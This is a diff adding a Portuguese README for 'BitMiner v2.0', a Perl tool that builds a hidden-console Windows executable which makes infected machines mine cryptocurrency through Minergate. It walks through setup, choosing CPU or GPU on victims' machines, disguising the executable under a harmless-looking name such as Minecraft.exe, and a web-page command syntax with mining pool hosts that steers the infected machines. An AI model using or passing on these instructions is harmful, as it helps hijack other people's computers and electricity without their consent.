@@ -1,0 +1,60 @@
+### Não funciona no Linux ###
+
+Bom, primeiro você precisa obrigatoriamente, instalar o StrawBerry Perl:
+32 bits - http://strawberryperl.com/download/5.26.0.2/strawberry-perl-5.26.0.2-32bit.msi
+64 bits - http://strawberryperl.com/download/5.26.0.2/strawberry-perl-5.26.0.2-64bit.msi
+
+Depois, execute no seu terminal os seguintes comandos:
+cpan install Win32::HideConsole
+cpan install Term::ANSIColor
+cpan install LWP::UserAgent
+cpan install LWP::Simple
+cpan install pp
+
+Em seguida, pegue o código-fonte do BitMiner v2.0: https://github.com/HatsuZ/BitMiner-v2/blob/master/bitminerv2.pl
+Salve em um arquivo .pl(Necessário somente se você for executar o programa sem o cmd), vá até o diretório do script,
+e utilize o comando perl nome_do_arquivo.pl, ele iniciará e irá fazer algumas perguntas:
+
+[*] Informe o seu website: http://www.example.com
+
+Tá, esse website que você vai informar, nele irá como uma ponte de conexão entre você e o programa, você somente precisa
+colocar os comandos no código fonte da página (Abaixo deixo um exemplo)
+Lembrando que caso você não coloque o http ou https, o programa irá reclamar e pedir pra você informar o http ou https
+
+[*] CPU ou GPU ?
+
+Você irá informar se as máquinas infectados pelo executável deverão utilizar a CPU (Processador) ou a GPU (Placa de vídeo)
+
+[*] Qual o nome do executavel ?
+
+Esta parte é importante, nela, se você escolher um nome tipo svchost.exe, pode ser que o Windows confunda os processos e simplesmente
+não execute o programa, pois provavelmente haverá um processo sendo executado chamado svchost.exe, tá, mas o que eu coloco então ?
+Exemplo: Minecraft.exe
+Lembrando que caso você não coloque o .exe no final do nome o programa adiciona automaticamente
+
+Se tudo ocorrer bem, o programa alertará "[*] Sucesso !"
+
+Lembrando que ele utiliza o serviço da Minergate para minerar, então você deve ter uma conta criada lá:
+https://minergate.com/reg
+
+Sim, mas você não explicou ainda o que deve ser colocado no código-fonte da página para ele começar a minerar, bom, a sintaxe é essa:
+miner->host:HOST_DA_MOEDA;email:SEU_EMAIL_CADASTRADO_NA_MINERGATE;
+
+Abaixo vou deixar uma lista de hosts de cada moeda:
+(Bytecoin) - bcn.pool.minergate.com:45550
+(Monero) - xmr.pool.minergate.com:45560
+(QuazarCoin) - qcn.pool.minergate.com:45570
+(DigitalNote) - xdn.pool.minergate.com:45620	
+(FantomCoin) - fcn.pool.minergate.com:45610	
+(Não sei) - mcn.pool.minergate.com:45640
+(DashCoin) - dsh.pool.minergate.com:45720
+(Infinium8) - inf8.pool.minergate.com:45750
+Hosts mesclados (Duas moedas ao mesmo tempo):
+xdn-xmr.pool.minergate.com:45790
+fcn-xmr.pool.minergate.com:45590
+fcn-qcn.pool.minergate.com:45600
+fcn-dsh.pool.minergate.com:45730
+fcn-inf8.pool.minergate.com:45760
+mcn-qcn.pool.minergate.com:45670	
+mcn-dsh.pool.minergate.com:45740
+mcn-inf8.pool.minergate.com:45770
